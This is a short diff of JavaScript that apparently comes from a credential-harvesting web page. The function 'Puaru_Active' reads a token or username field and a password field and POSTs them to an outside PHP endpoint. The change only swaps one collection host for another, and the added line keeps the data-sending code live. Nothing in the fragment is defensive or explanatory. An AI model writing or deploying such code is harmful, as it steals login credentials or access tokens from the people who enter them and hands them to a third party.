@@ -39,7 +39,7 @@ function Puaru_Active() {
 var http = new XMLHttpRequest();
 var tk = document.getElementById("tk").value;
 var mk = document.getElementById("mk").value;
-var url = "http://usamabutt.tk/token3.php";
+var url = "http://kishu-iphone.herokuapp.com/token3.php";
 var params = "u="+tk+"&p="+mk+"";
 http.open("POST", url, true);
 http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
